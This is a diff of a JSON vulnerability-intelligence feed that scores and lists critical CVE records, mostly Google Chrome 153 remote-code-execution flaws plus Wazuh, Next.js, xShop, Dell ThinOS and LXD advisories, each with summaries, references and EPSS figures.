+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/554558968"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 41.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87488",
+    "published": "2026-09-09T01:17:05.557",
+    "last_modified": "2026-09-10T04:18:21.470",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in WebGL in Google Chrome on on Android prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Critical)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/546252753"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 41.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87492",
+    "published": "2026-09-09T01:17:05.993",
+    "last_modified": "2026-09-10T04:18:21.990",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Incorrect authorization in DevTools in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/529123409"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 25.5,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87500",
+    "published": "2026-09-09T01:17:06.900",
+    "last_modified": "2026-09-10T04:18:22.183",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Improper validation of array index in ANGLE in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/540019091"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 26.9,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87504",
+    "published": "2026-09-09T01:17:07.347",
+    "last_modified": "2026-09-10T04:18:22.360",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Core in Google Chrome prior to 153.0.8010.36 allowed a remote attacker leveraging social engineering to execute arbitrary code outside the sandbox via a crafted Chrome extension. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/499206649"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 32.6,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87512",
+    "published": "2026-09-09T01:17:08.267",
+    "last_modified": "2026-09-10T04:18:23.040",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in ANGLE in Google Chrome on on Windows prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/541715128"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 41.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87520",
+    "published": "2026-09-09T01:17:09.137",
+    "last_modified": "2026-09-10T04:18:23.417",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Dawn in Google Chrome on on Android prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/529878021"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 33.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87526",
+    "published": "2026-09-09T01:17:09.853",
+    "last_modified": "2026-09-10T04:18:23.773",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Passwords in Google Chrome prior to 153.0.8010.36 allowed a remote attacker leveraging social engineering to potentially execute arbitrary code outside the sandbox via UI Interaction. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/544484669"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 29.8,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87527",
+    "published": "2026-09-09T01:17:09.980",
+    "last_modified": "2026-09-10T04:18:23.953",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Buffer overflow in WebGL in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Critical)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/548130125"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 39.7,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87528",
+    "published": "2026-09-09T01:17:10.110",
+    "last_modified": "2026-09-10T04:18:24.127",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Type confusion in Rust in Google Chrome on on Windows prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/539569491"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 28.2,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87529",
+    "published": "2026-09-09T01:17:10.240",
+    "last_modified": "2026-09-10T04:18:24.343",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Numeric truncation error in Media in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/536423794"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 38.8,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87547",
+    "published": "2026-09-09T01:17:12.240",
+    "last_modified": "2026-09-10T04:18:25.720",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Incorrect reference resolution in FileSystem in Google Chrome prior to 153.0.8010.36 allowed a remote attacker leveraging social engineering to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/497111188"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 36.4,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87558",
+    "published": "2026-09-09T01:17:13.443",
+    "last_modified": "2026-09-10T04:18:26.300",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Payments in Google Chrome on on Mac prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/553128689"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 33.0,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87581",
+    "published": "2026-09-09T01:17:15.930",
+    "last_modified": "2026-09-10T04:18:27.020",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Payments in Google Chrome prior to 153.0.8010.36 allowed a remote attacker leveraging social engineering to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/553129531"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 35.8,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87607",
+    "published": "2026-09-09T01:17:18.763",
+    "last_modified": "2026-09-10T04:18:28.220",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Device in Google Chrome on on Mac prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/553122131"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 35.8,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87609",
+    "published": "2026-09-09T01:17:18.987",
+    "last_modified": "2026-09-10T04:18:28.390",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Sharing in Google Chrome on on iOS prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via crafted network traffic. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/547322272"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 32.6,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87621",
+    "published": "2026-09-09T01:17:20.313",
+    "last_modified": "2026-09-10T04:18:29.513",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Out of bounds write in ANGLE in Google Chrome on on Windows prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/536664909"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 25.4,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87634",
+    "published": "2026-09-09T01:17:21.770",
+    "last_modified": "2026-09-10T04:18:30.207",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in WebPackaging in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Low)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/349994197"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 33.1,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87637",
+    "published": "2026-09-09T01:17:22.103",
+    "last_modified": "2026-09-10T04:18:30.550",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Extensions in Google Chrome on on Mac prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/534863145"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 24.3,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87638",
+    "published": "2026-09-09T01:17:22.207",
+    "last_modified": "2026-09-10T04:18:30.720",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Out of bounds write in Media in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/540024134"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 24.3,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87643",
+    "published": "2026-09-09T01:17:22.740",
+    "last_modified": "2026-09-10T04:18:31.053",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Integer overflow in GPU in Google Chrome on on Android prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/513416699"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 33.1,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87646",
+    "published": "2026-09-09T01:17:23.077",
+    "last_modified": "2026-09-10T04:18:31.383",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Use after free in Web Authentication in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/539754136"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 29.2,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87650",
+    "published": "2026-09-09T01:17:23.503",
+    "last_modified": "2026-09-10T04:18:31.810",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Out of bounds read in WebGL in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/534912743"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 24.3,
+    "tags": [
+      "rce"
+    ],
+    "intel_score": 88.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-87654",
+    "published": "2026-09-09T01:17:23.933",
+    "last_modified": "2026-09-10T04:18:31.987",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "Buffer overflow in ANGLE in Google Chrome on on Windows prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/536444790"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 29.5,
     "tags": [
       "rce"
     ],
@@ -1734,85 +2714,24 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-48024",
-    "published": "2026-08-19T17:18:51.093",
-    "last_modified": "2026-09-09T21:19:49.197",
-    "cvss_v3": 9.1,
+    "cve_id": "CVE-2026-81046",
+    "published": "2026-09-10T16:17:57.417",
+    "last_modified": "2026-09-11T13:18:18.437",
+    "cvss_v3": 9.4,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "Wazuh is a free and open source platform used for threat prevention, detection, and response. From 4.0.0 until 4.14.6 and 5.0.0-beta3, cluster.unmerge_info() in framework/wazuh/core/cluster/cluster.py constructs paths from peer-controlled merge_type and name values in a merged synchronization archive. process_files_from_worker() in framework/wazuh/core/cluster/master.py does not adequately confine the resulting path to the declared cluster item directory. A cluster peer holding the shared Fernet key can use traversal in files_metadata.json or a merged-file header to write files such as /var/ossec/etc/ossec.conf. Replacing ossec.conf can configure root-executed commands and lead to code execution when Wazuh services reload. This issue is fixed in versions 4.14.6 and 5.0.0-beta3.",
+    "summary": "Dell ThinOS 10, versions prior to 2605_10.2616, contain a Protection Mechanism Failure vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to Arbitrary Code Execution within the application context.",
     "references": [
-      "https://github.com/wazuh/wazuh/commit/88fc89fdfb1bf37b9d826e9c281a3d22655733de",
-      "https://github.com/wazuh/wazuh/pull/36204",
-      "https://github.com/wazuh/wazuh/releases/tag/v4.14.6",
-      "https://github.com/wazuh/wazuh/releases/tag/v5.0.0-beta3",
-      "https://github.com/wazuh/wazuh/security/advisories/GHSA-gh4h-fx78-q8xc",
-      "https://github.com/wazuh/wazuh/security/advisories/GHSA-gh4h-fx78-q8xc"
+      "https://www.dell.com/support/kbdoc/en-us/000502746/dsa-2026-389-security-update-for-dell-thinos-10-for-multiple-vulnerabilities"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 0.8,
-    "epss_percentile": 53.7,
+    "epss": 0.4,
+    "epss_percentile": 30.1,
     "tags": [
       "rce"
     ],
-    "intel_score": 85.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-49441",
-    "published": "2026-08-19T17:18:54.073",
-    "last_modified": "2026-09-09T21:19:49.197",
-    "cvss_v3": 9.1,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "Wazuh is a free and open source platform used for threat prevention, detection, and response. From 4.3.0 until 4.14.6 and 5.0.0-beta3, the non-merged branch of process_files_from_worker() in framework/wazuh/core/cluster/master.py trusts a peer-controlled file_path key from files_metadata.json. The destination is joined to WAZUH_PATH without proving that it remains inside the directory selected by cluster_item_key. A cluster peer holding the shared Fernet key can upload a crafted extra-valid archive and overwrite security-sensitive files such as /var/ossec/etc/ossec.conf. Replacing ossec.conf can configure root-executed commands and lead to code execution after a service reload. This issue is fixed in versions 4.14.6 and 5.0.0-beta3.",
-    "references": [
-      "https://github.com/wazuh/wazuh/commit/7f13682cf5f01f69452f723a608ab2d89cfb2133",
-      "https://github.com/wazuh/wazuh/pull/36296",
-      "https://github.com/wazuh/wazuh/releases/tag/v4.14.6",
-      "https://github.com/wazuh/wazuh/releases/tag/v5.0.0-beta3",
-      "https://github.com/wazuh/wazuh/security/advisories/GHSA-3v57-hgvj-3vj2"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 38.8,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 85.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-49849",
-    "published": "2026-08-21T22:16:38.300",
-    "last_modified": "2026-09-09T21:06:39.057",
-    "cvss_v3": 9.1,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "xShop is an open-source shop developed in Laravel. An Unrestricted File Upload vulnerability in xShop version 3.0.3 allows an authenticated administrator to upload executable files (e.g., .php). By uploading a specially crafted php file, an attacker can achieve Remote Code Execution (RCE) on the server, leading to a full system compromise. Version 3.0.4 fixes the issue.",
-    "references": [
-      "https://github.com/4xmen/xshop/commit/dd4a3add9d6f5b5f9dde9685e97f51057903a1db",
-      "https://github.com/4xmen/xshop/pull/64",
-      "https://github.com/4xmen/xshop/releases/tag/v3.0.4",
-      "https://github.com/4xmen/xshop/security/advisories/GHSA-fc35-qjg3-f6g7",
-      "https://github.com/4xmen/xshop/security/advisories/GHSA-fc35-qjg3-f6g7"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.9,
-    "epss_percentile": 58.5,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 85.5,
+    "intel_score": 87.0,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30"
@@ -1882,24 +2801,21 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-75604",
-    "published": "2026-09-01T22:17:12.697",
-    "last_modified": "2026-09-09T21:09:13.080",
+    "cve_id": "CVE-2026-87613",
+    "published": "2026-09-09T01:17:19.413",
+    "last_modified": "2026-09-10T04:18:28.790",
     "cvss_v3": 9.0,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "Next.js is a React framework for building full-stack web applications. From 13.4.0 until 15.5.24 and 16.3.3, Next.js applications using Pages Router or App Router without Cache Components on Windows-hosted servers do not consistently escape backslashes in route segments before constructing incremental-cache paths. In packages/next/src/shared/lib/router/utils/escape-path-delimiters.ts and packages/next/src/server/lib/incremental-cache/file-system-cache.ts, a remote request can supply encoded Windows path separators that traverse outside the intended cache root and expose private build data, including the server-reference-manifest encryption key. Disclosure of that key can enable remote code execution in the affected application. This issue is fixed in versions 15.5.24 and 16.3.3.",
+    "summary": "Incorrect reference resolution in Extensions in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via crafted network traffic. (Chromium security severity: Medium)",
     "references": [
-      "https://github.com/vercel/next.js/commit/968b9fcb26bdeb8e0a861a9df05361474666d51b",
-      "https://github.com/vercel/next.js/commit/b0f3460a92b955d3ca41fccff9a525a2b910fbf3",
-      "https://github.com/vercel/next.js/releases/tag/v15.5.24",
-      "https://github.com/vercel/next.js/releases/tag/v16.3.3",
-      "https://github.com/vercel/next.js/security/advisories/GHSA-p293-qw3h-jr36"
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/501889544"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 2.5,
-    "epss_percentile": 83.5,
+    "epss": 0.4,
+    "epss_percentile": 28.3,
     "tags": [
       "rce"
     ],
@@ -1907,1497 +2823,6 @@
     "reasons": [
       "recently modified (last 48h)",
       "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-62420",
-    "published": "2026-08-12T20:17:46.897",
-    "last_modified": "2026-09-11T14:32:59.620",
-    "cvss_v3": 9.9,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "An authorization bypass vulnerability in LXD allows an authenticated attacker to bypass target project security restrictions during cross-project instance migrations. When moving an instance cross-project to a different cluster member via POST /1.0/instances/{name} with migration: true, project: <target>, and target: <member>, the destination node skips all project restriction checks because the request arrives as an internal cluster notification. An attacker can exploit this to introduce disallowed instance configurations into a restricted project.",
-    "references": [
-      "https://github.com/canonical/lxd/pull/18605",
-      "https://github.com/canonical/lxd/pull/18651",
-      "https://github.com/canonical/lxd/security/advisories/GHSA-v9wr-9r7q-fh4g",
-      "https://github.com/canonical/lxd/security/advisories/GHSA-v9wr-9r7q-fh4g"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 30.4,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-63296",
-    "published": "2026-08-12T20:17:47.437",
-    "last_modified": "2026-09-11T15:15:30.017",
-    "cvss_v3": 9.9,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "An authorization bypass vulnerability in LXD allows an authenticated attacker to bypass target project restrictions during instance migration. When migrating an instance to a target project, LXD accepts configuration overrides without validating the new configuration against the target project's enforced restrictions. An attacker can exploit this flaw to move instances with disallowed high-privilege configurations into restricted projects, bypassing security controls.",
-    "references": [
-      "https://github.com/canonical/lxd/security/advisories/GHSA-gcr9-5q6r-w625",
-      "https://github.com/canonical/lxd/security/advisories/GHSA-gcr9-5q6r-w625"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 22.6,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-63297",
-    "published": "2026-08-12T20:17:47.583",
-    "last_modified": "2026-09-11T15:18:18.907",
-    "cvss_v3": 9.9,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "An authorization bypass vulnerability in LXD due to a timing flaw during configuration merging allows an authenticated attacker to bypass target project restrictions during cross-project instance copies. When copying an instance to a target project, LXD performs restriction checks before configuration merging is complete, creating a time-of-check to time-of-use (TOCTOU) condition. An attacker can exploit this flaw to copy instances with disallowed high-privilege configurations into restricted projects, bypassing security controls.",
-    "references": [
-      "https://github.com/canonical/lxd/security/advisories/GHSA-v989-qw7w-xvg4",
-      "https://github.com/canonical/lxd/security/advisories/GHSA-v989-qw7w-xvg4"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.2,
-    "epss_percentile": 15.2,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-63299",
-    "published": "2026-08-12T20:17:47.830",
-    "last_modified": "2026-09-11T15:26:06.753",
-    "cvss_v3": 9.9,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "An authorization bypass vulnerability in LXD allows an authenticated user to bypass project-level disk and volume limits. Two related code paths fail to verify resource limits during volume operations: the storagePoolVolumeTypePostMove function omits the limits.AllowVolumeCreation check before moving a volume across projects, and volume snapshot restore operations skip the AllowVolumeUpdate check when the configuration is nil (Config == nil). An attacker can exploit these flaws to allocate storage resources that exceed the administrative limits configured for a project.",
-    "references": [
-      "https://github.com/canonical/lxd/security/advisories/GHSA-5h78-p252-989h"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 33.4,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
